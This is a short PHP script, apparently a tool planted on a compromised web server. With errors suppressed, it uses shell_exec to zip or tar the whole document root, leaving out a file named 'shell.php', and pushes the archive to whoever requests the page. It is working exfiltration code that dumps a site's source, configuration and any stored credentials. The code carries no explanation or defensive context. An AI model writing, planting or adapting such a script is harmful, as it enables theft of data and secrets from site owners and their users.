<?php
    error_reporting(0);

    $dir = $_SERVER['DOCUMENT_ROOT'];

    if(function_exists('shell_exec'))
    {
        if(shell_exec("zip --exclude='shell.php' -r www.zip $dir*"))
        {
            file_force_download('www.zip');
        }
        elseif(shell_exec("tar --exclude='shell.php' -cvf www.tar $dir*"))
        {
            file_force_download('www.tar');
        }
    }
    else
    {
        print_r('none :|');
    }

    function file_force_download($file)
    {
        if(file_exists($file))
        {
            if(ob_get_level())
            {
                ob_end_clean();
            }

            header('Content-Description: File Transfer');
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename=' . basename($file));
            header('Content-Transfer-Encoding: binary');
            header('Expires: 0');
            header('Cache-Control: must-revalidate');
            header('Pragma: public');
            header('Content-Length: ' . filesize($file));

            readfile($file);
            exit;
        }
    }
?>
